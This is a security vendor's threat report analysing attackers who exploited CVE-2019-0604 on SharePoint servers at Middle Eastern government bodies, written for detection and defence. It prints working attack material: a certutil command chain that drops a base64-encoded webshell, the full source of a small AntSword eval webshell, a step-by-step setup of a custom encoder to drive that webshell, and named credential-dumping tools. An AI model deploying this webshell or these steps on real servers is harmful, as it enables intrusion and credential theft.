One of these webshells is the open source AntSword webshell\nfreely available on Github, which is remarkably similar to the infamous China Chopper webshell.\n\nOn January 10, 2020, we used Shodan to search for Internet accessible servers running versions\nof SharePoint vulnerable to CVE-2019-0604. While admittedly the version numbers provided by\nSharePoint within HTTP responses do not always provide the precise SharePoint version\nnumber, we decided to use it to check if it was less than the version numbers of the patched\n[SharePoint versions from the Microsoft advisory. We performed this comparison and found](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0604)\n28,881 servers that advertised a vulnerable version of SharePoint. We did not actively check\neach server to verify if they were indeed vulnerable, so it is possible that many of these publicfacing SharePoint servers were not vulnerable or since patched. Regardless, the sheer number of\nservers and publicly available exploit code suggests that CVE-2019-0604 is still a major attack\nvector.\n\nUsing this collection of webshells, the actors moved laterally to other systems on the network by\n[dumping credentials with a variant of the notorious Mimikatz tool and using Impacket’s atexec tool](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)\nto use dumped credentials to run commands on other systems. On September 19, 2019, we\nobserved the same exact Mimikatz variant uploaded to a webshell hosted at another government\n\n\n-----\n\norganization in a second country in the Middle East. The Mimikatz variant uploaded to these two\norganizations is unique, as it involves a seemingly custom loader application written in .NET.\nTherefore, we believe that the same threat group is behind both intrusions.\n\nBack in April 2019, we first observed the Emissary Panda threat group exploiting CVE-2019-0604\nto install webshells on SharePoint servers at government organizations in two Middle Eastern\ncountries. Fast forward five months to the current attacks and we see exploitation of the same\nvulnerability at government organizations in two different countries compared to the April attacks.\nWe do not have any strong ties to connect the current attacks exploiting this vulnerability in\nSharePoint with the Emissary Panda attacks carried out in April. The overlaps between these two\nsets of attacks include exploitation of a common vulnerability, similar toolset and a shared\ngovernment victimology, but no strong pivot points to connect these attack campaigns together.\n\nThe exploitation of this vulnerability is not unique to Emissary Panda, as multiple threat groups\nare using this vulnerability to exploit SharePoint servers to gain initial access to targeted\nnetworks. We would like to acknowledge the possibility of an overlap in the AntSword webshell,\nas we stated that Emissary Panda used China Chopper in the April attacks and AntSword and\nChina Chopper webshells are incredibly similar. However, at this time we do not believe the April\nattacks used AntSword based on artifacts analyzed on the SharePoint server, specifically none of\nthe IIS logs in the April attacks used the AntSword User-Agent in requests to the webshell that\nwere observed in the current attacks.\n\nPalo Alto Networks customers are protected from the threat described in this blog through Threat\nPrevention signatures for the exploits and C2 traffic as well as through WildFire. More details on\nthis protection is available in the conclusion of the report.\n\n### Exploiting CVE-2019-0604\n\nOn September 10, 2019, we observed an HTTP POST request to the following URL that we\n[believe was the exploitation of CVE-2019-0604 in a publicly facing SharePoint server (T1190):](https://attack.mitre.org/techniques/T1190/)\n\n/_layouts/15/picker.aspx\n\nWe did not have access to the data sent within the HTTP POST request above, however, we\nobserved the following command executed on the SharePoint server at the time of the inbound\nrequest:\n\nC:\\Windows\\System32\\cmd.exe /c echo\nPCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBEZWJ1Zz0idHJ1ZSIgVHJhY2U9ImZhbHNlIiAlPg[..snip..]\n\n- c:\\programdata\\cmd.txt & certutil -decode c:\\programdata\\cmd.txt C:\\Program Files\\Common\nFiles\\microsoft shared\\Web Server Extensions\\14\\TEMPLATE\\LAYOUTS\\c.aspx & certutil decode c:\\programdata\\cmd.txt C:\\Program Files\\Common Files\\microsoft shared\\Web Server\nExtensions\\15\\TEMPLATE\\LAYOUTS\\c.aspx & certutil -decode c:\\programdata\\cmd.txt\nC:\\Program Files\\Common Files\\microsoft shared\\Web Server\nExtensions\\16\\TEMPLATE\\LAYOUTS\\c.aspx\n\nThe command above uses the echo command to write a large chunk of base64 encoded data to\na text file named cmd.txt. The command then uses the certutil application to convert the base64\n[encoded data (T1132) in the cmd txt file to c aspx in three different SharePoint related folders](https://attack.mitre.org/techniques/T1132/)\n\n\n-----\n\n[The result of this entire command saves a variant of the Awen asp.net webshell (T1100) to the](https://github.com/SecWiki/WebShell-2/blob/master/Aspx/awen%20asp.net%20webshell.aspx)\nSharePoint server to further interact with the compromise server. The Awen webshell deployed in\nthe exploitation of this SharePoint vulnerability had a SHA256 hash of\n5d4628d4dd89f31236f8c56686925cbb1a9b4832f81c95a4300e64948afede21.\n\n### Actor’s Awen Webshell\n\nJust 40 seconds after the suspected exploitation of CVE-2019-0604, we observed the first HTTP\nGET request to a webshell at c.aspx, which is a modified version of the freely available awen\nasp.net webshell. We believe this HTTP GET request was the actor visiting the webshell after\nexploitation and prior to executing commands. Figure 1 shows the Awen webshell, which has little\nfunctionality outside of setting the path to the command prompt application and running\ncommands.\n\nFigure 1 Awen webshell installed by actor after exploiting CVE-2019-0604\n\nThe actor uses the Awen webshell seen in Figure 1 to run various commands to do an initial\n[discovery on the system and network, including user accounts (T1033 and T1087), files and](https://attack.mitre.org/techniques/T1033/)\n[folders (T1083), privileged groups (T1069), remote systems (T1018) and network configuration](https://attack.mitre.org/techniques/T1087/)\n[(T1016). Table 1 not only shows the commands used for discovery, but also the commands used](https://attack.mitre.org/techniques/T1016/)\nto deploy another webshell to the server using the echo command to write base64 encoded data\nto a.txt and using the certutil application to decode and save to bitreeview.aspx. Table 1 also\nshows the time delta between the commands executed using the Awen webshell to provide\ninsight into the tempo at which this actor executed commands.\n\n\n#### Time delta from previous command\n\n 3 minutes 55 sec‐ onds (from initial exploitation)\n\n\n#### Command\n\n dir c:\\programdata\\\n\n\n#### 14 seconds query user\n\n\n-----\n\n#### 15 seconds net group /do\n\n 32 seconds whoami\n\n 18 seconds net user <redacted hostname> /do\n\n 12 seconds net localgroup administrators\n\n 21 seconds ping -n 1 8.8.8.8\n\n 20 seconds net group exchange servers /do\n\n 22 seconds ipconfig /all\n\n 23 seconds ping -n 1 -a 10.x.x.x\n\n\n#### 10 minutes 53 seconds\n\n\n#### echo PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQi[..snip..] > c:\\programdata\\a.txt\n\n\n#### 5 seconds type c:\\programdata\\a.txt\n\n 5 seconds certutil -decode c:\\programdata\\a.txt c:\\program files\\common files\\microsoft shared\\web server extensions\\14\\template\\layouts\\bitreeview.aspx\n\n 23 seconds del c:\\programdata\\a.txt\n\n_Table 1 Awen webshell installed by actor after exploiting CVE-2019-0604_\n\nThe webshell named bitreeview.aspx was saved to a folder within the SharePoint server’s install\npath. The bitreeview.aspx file is a variant of the AntSword webshell that has undeniably similar\ntraits as the infamous China Chopper webshell. After installing this AntSword webshell, the actor\nno longer uses the Awen webshell and issues the first command to AntSword 35 seconds after\nthe last command issued to the Awen webshell.\n\n### Actor’s AntSword Webshell\n\nAntSword is a modular webshell that involves a very simple webshell that the actor would deploy\nto the compromised server and a client application referred to as the AntSword Shell Manager.\nThe use of the client application differs from many other webshells that the actor would interact\nwith in a browser window. The actor would use the AntSword Shell Manager to interact with the\nAntSword webshell on the compromised server, as the Shell Manager sends the appropriate\nscript to the webshell that will execute to carry out the desired action. To provide a sense of the\nlimited functionality within the webshell itself, the bitreeview.aspx AntSword webshell deployed in\nthis attack (SHA256:\n15ecb6ac6c637b58b2114e6b21b5b18b0c9f5341ee74b428b70e17e64b7da55e) was only 162\nbytes and contained the following:\n\n\n-----\n\n#### 1\n\n 2\n\n 3\n\n 4\n\n 5\n\n 6\n\n 7\n\n\n#### %@ Page Language=\"Jscript\"%\n\n %\n\n eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.\n\n FromBase64String(Request.Item[\"Darr1R1ng\"])),\"unsafe\"); %\n\n\nAs you can see from the code above, the AntSword webshell has no functionality other than\nrunning a script provided by the AntSword Shell Manager, specifically within a field named\nDarr1R1ng of an HTTP POST request. The code above also tells us the actors had created their\nown custom “encoder” within the AntSword Shell Manager to be able to interact with the code\nabove, which we will discuss in detail in the next section.\n\nThe actors used the AntSword webshell to run a variety of commands on the compromised\nserver. The following are a list of the initial commands issued using this webshell that will attempt\nto do initial system and user discovery, as well as attempt to ping systems of interest:\n\n1. whoami\n2. query user\n3. nltest /domain_Trusts\n4. ping -n 1 <redacted domain name>\n5. ipconfig /all\n6. net group /do\n7. net group Exchange Servers /do\n8. ing -n 1 <redacted hostname of Exchange server>\n9. ping -n 1 <redacted hostname of Exchange server>\n10. query user\n\nThe ping attempts suggests that this actor seeks to gain access to Microsoft Exchange servers,\nwhich may be part of their objective or they desire the elevated privileges on the domain that an\nExchange server provides. Also, the ping attempts show the actor misspelled the command their\nfirst attempt, which suggests that these commands were issued with hands on-keyboard and not\nthrough an automated script. Figure 2 shows the terminal interface within the AntSword Shell\nManager application through which the actors would have issued commands.\n\n\n-----\n\nFigure 2 Terminal within AntSword’s Shell Manager interacting with webshell\n\nWhile we did not have 100% visibility, we also believe the actors used the AntSword webshell to\nupload tools to the server as well, specifically cURL, a custom Mimikatz variant, and compiled\n[variants of Impacket’s wmiexec and atexec tools. AntSword has a FileManager interface that](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)\nprovides a navigation capability similar to Windows Explorer, which allows the actor to upload and\ndownload files to and from the compromised server. Figure 3 shows the FileManager interface\nwithin the AntSword Shell Manager application.\n\n\n-----\n\nFigure 3 FileManager interface within AntSword’s Shell Manager using the webshell\n\nThe actor issued commands to the webshell using these uploaded tools. For instance, the cURL\ntool was used in the command curl.exe ipinfo.io —max–time 5 to determine if the server had\noutbound access to the Internet and to obtain the external IP address of the compromised\nsystem. The actors used the ‘net use’ command, Mimikatz and the Impacket tools specifically for\n[lateral movement. It appears the actors used Mimikatz to dump credentials from memory (T1003)](https://attack.mitre.org/techniques/T1003/)\n[and used the Impacket tools to use the pass the hash (T1075) technique to run commands on](https://attack.mitre.org/techniques/T1075/)\nother systems.\n\n### Actor’s Custom AntSword Encoder\n\nTo use the AntSword webshell installed on the SharePoint server, the actor had to create a\ncustom encoding module in AntSword. We know this as the default encoders in the AntSword\nShell Manager were unable to successfully interact with the bitreeview.aspx webshell. We found\nthat the default base64 encoder would not base64 encode the data in the Darr1R1ng field, rather\nit would deliver it in cleartext, as seen in HTTP POST request seen in Figure 4. When we\nattempted to use the default base64 encoder to interact with the bitreeview.aspx webshell\ninstalled by the threat actor, the server responded with HTTP 500 error messages as the cleartext\nDarr1R1ng field contained characters that were not in the base64 alphabet.\n\n\n-----\n\nFigure 4 HTTP POST request issued by AntSword Shell Manager to webshell using default base64 encoder\n\nWe determined that the actor must have created a custom encoding module in the AntSword\nShell Manager that base64 encoded the entire Darr1R1ng field to successfully interact with the\nbitreeview.aspx webshell. The AntSword Shell Manager includes an interface for a user to create\na custom encoding module, so we set out to determine the steps the actor would take to be able\nto create this custom encoding to start interacting with the webshell.\n\n1. The actor would first start by opening the AntSword Shell Manager. Based on our analysis,\nthey used AntSword v2.1 specifically.\n\n2. Before interacting with the installed webshell, the actor had to create a custom encoding\nmodule. To create the custom encoding module, the actor would click the AntSword > Encoders\nmanager from the menu.\n\n3. In the Encoder Manager interface, the actor would click the New Encoder button.\n\n\n-----\n\n4. From the New Encoder drop down, the actor would select ASPX as the AntSword webshell\ninstalled on the SharePoint server was an ASPX file.\n\n5. The actor would have to name the new encoder and click the blue button to continue. We\nchose the default name ‘myencoder’ for this example.\n\n6. After creating the new encoder, the actor would select the encoder and click the Edit menu\nbutton.\n\n\n-----\n\n7. After clicking the Edit button, the EditEncoder window opens and provides an example encoder\nthat the actor can modify. To use the ‘bitreeview.aspx’ webshell on the server, the actor must have\nmodified line 24 of the example encoder to base64 encode the contents ‘Darr1R1ng’ field instead\nof leaving them in cleartext.\n\n8. To base64 encode the ‘Darr1R1ng’ field, the actor would modify line 24 to code that has the\nsame functionality as the code displayed in line 24 now. The actor would click the Save menu\nbutton to save the new custom encoding module.\n\n9. With the custom encoding module created, the actor would now add a new shell in the Shell\nManager window by right clicking and selecting the Add button.\n\n\n-----\n\n10. The Add shell interface opens and allows the actor to configure the location of the shell, the\nname of the field within the HTTP POST request and the encoding module the webshell will use\nto interact with the Shell Manager.\n\n11. In this incident, the actor would have added the following settings and clicked the Add menu\nbutton:\n\n1.\n\n1. Set ‘Shell url’ to URL to the ‘bitreeview.aspx’ webshell (localhost in our testing)\n2. Set ‘Shell pwd’ to the word ‘Darr1R1ng’\n3. Set ‘Shell type’ to “ASPX” from the drop down\n4. Checked the radio box next to ‘myencoder’ to select the custom encoder.\n\n\n-----\n\n12. After clicking the Add button, the shell is now listed within the Shell Managers interface.\n\n13. To interact with the webshell, the actor would right click the shell and choose actions from the\ndisplayed menu. To run commands on the webserver, the actor would select the Terminal menu\nbutton.\n\n\n-----\n\n14. The AntSword Shell Manager displays an interface that resembles a command prompt\nwindow. It also includes information about the system that the webshell is running on, such as the\noperating system, current user, current working directory and the storage volumes on the server.\n\n15. The actor would issue the desired commands in this window, which the webshell would run\nand respond with the results.\n\n16. If the actor wished to interact directly with the compromised server’s file system, they could\nchoose the FileManager menu button from the Shell Manager.\n\n\n-----\n\n### AntSword Similarity to China Chopper\n\nAntSword and China Chopper are both modular webshells that actors would interact with using a\nclient application instead of a web browser. It appears that developers of AntSword may have\nused China Chopper as a basis for their tool, as the default China Chopper webshell works with\nthe default encoder of AntSword’s ASPX webshell. The major differences between the two\ninvolves the code and parameters the two client applications send to the webshell to run\ncommands and other activities. For instance, China Chopper uses two parameters named z1 and\nz2 when running commands via the webshell, as seen in Figure 5, whereas AntSword uses four\nrandomly generated names each execution, as seen in Figure 6.\n\nFigure 5 HTTP POST request to China Chopper webshell to run a command with arrows pointing to its required\n\nparameters\n\n\n-----\n\nFigure 6 HTTP POST request to AntSword webshell to run a command with arrows pointing to its required\n\nparameters\n\nNot only do the parameters differ, but the code sent to the webshell differs as well. As you can\nsee in Figure 7, the code used to run commands on the webshell by AntSword and China\nChopper have several lines of code that are exactly the same, while some lines of code differ and\nseveral lines were added to AntSword’s code on the right. The code on the right side of Figure 7\nis AntSword, which includes additional lines of code to allow the actor to set environment\nvariables before running the command.\n\nFigure 7 Comparison between code used by AntSword and China Chopper to run a command on the webshell\n\n### Tools Seen in Related Webshell\n\nWhen analyzing tools uploaded to the AntSword webshell, we discovered the same Mimikatz\nsample uploaded to a webshell hosted on a server at another government organization in a\ndifferent Middle Eastern country. On September 19, 2019, the actor uploaded this Mimikatz\nsample to the webshell hosted at a URL:\n\n<redacted domain>/uploadedFiles/green_post.aspx\n\n\n-----\n\nWe did not have access to the webshell hosted at this URL or visibility into the commands\nexecuted by the actor. We also do not know if the server is a SharePoint server or if a\nvulnerability was exploited to install the webshell. However, the Mimikatz sample was unique as it\nused a custom loader written in .NET, so we believe that the same threat group is involved in the\nintrusions at both of these government organizations.\n\nIn addition to the Mimikatz tool, the actor uploaded other tools to the webshell hosted at this\nsecond organization. Table 2 shows the executables uploaded to the webshell, which shows\nsimilar tools that actors uploaded to the AntSword webshell discussed earlier, including Mimikatz\nand Impacket’s atexec tool.\n\n#### SHA256 Filename Description\n\n da53dcaeed.. es.exe Mimikatz with custom loader\n\n 26d9212ec8.. Rar.exe Legitimate WinRAR\n\n a4aca75bcc.. atec.exe Compiled Impacket atexec tool\n\n e4e05c9a21.. dmp.exe Dumpert tool\n\n_Table 2 Tools uploaded to webshell hosted at second government organization_\n\nOne of the tools seen in Table 2 that caught our interest was the Dumpert tool, which is freely\navailable on Outflanknl’s GitHub repository. The author of Dumpert describes the tool as an\nLSASS dumping tool that uses direct system calls and API unhooking to evade antivirus and EDR\nsolutions. Dumpert is a relatively new tool with its initial commit to GitHub occurring on June 17,\n2019. While the Dumpert tool is meant to help red teams emulate an adversary, we had not seen\nthis tool used by threat actors until it was uploaded to this related webshell on September 23,\n2019.\n\n## Conclusion\n\n[Threat actors continue to exploit the CVE-2019-0604 vulnerability to compromise SharePoint](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0604)\n[servers, which is a vulnerability that Microsoft released a patch for in March 2019. We observed](https://support.microsoft.com/en-us/help/4462211/description-of-the-security-update-for-sharepoint-enterprise-server)\nactors installing webshells to the SharePoint server that they use to run commands and upload\nadditional tools to in order to dump credentials and move laterally to other systems on the\nnetwork. We were also able to find a related webshell based on the threat group’s tool reuse,\nspecifically a custom Mimikatz sample. Thanks to this tool reuse, we found the threat group\nuploading a credential dumping tool called Dumpert that we had not seen used in prior incidents\ninvolving the exploitation of CVE-2019-0604.\n\nPalo Alto Networks customers are protected by:\n\nThe CVE-2019-0604 vulnerability is covered by our IPS signature Microsoft SharePoint\nRemote Code Execution Vulnerability (55411)\nThe Awen Webshell is detected by our IPS signature Webshell.ASPX.git.Awen Command\nand Control Traffic (83202)\n\n\n-----\n\nThe AntSword ASPX Webshell is detected by our IPS signature AntSword Webshell\nCommand and Control Traffic Detection (85561, 85562, 85563)\nThe Mimikatz, Impacket atexec and Dumpert tools are all marked with malicious verdicts by\nWildFire.\n\n## Indicators of Compromise\n\n### Awen Webshell\n\n5d4628d4dd89f31236f8c56686925cbb1a9b4832f81c95a4300e64948afede21\n\n### AntSword Webshell\n\n15ecb6ac6c637b58b2114e6b21b5b18b0c9f5341ee74b428b70e17e64b7da55e\n\n### Mimikatz\n\nda53dcaeede03413ba02802c4be10883c4c28d3d28dee11734f048b90eb3d304\n\n### Related Tools\n\nda53dcaeede03413ba02802c4be10883c4c28d3d28dee11734f048b90eb3d304\n\n2836cf75fa0538b2452d77848f90b6ca48b7ff88e85d7b006924c3fc40526287\n\n26d9212ec8dbca45383eb95ec53c05357851bd7529fa0761d649f62e90c4e9fd\n\na4aca75bcc8f18b8a2316fd67a7e545c59b871d32de0b325f56d22584038fa10\n\ne4e05c9a216c2f2b3925293503b5d5a892c33db2f6ea58753f032b80608c3f2e\n\n### Get updates from Palo Alto Networks!\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n© 2020 Palo Alto Networks, Inc.
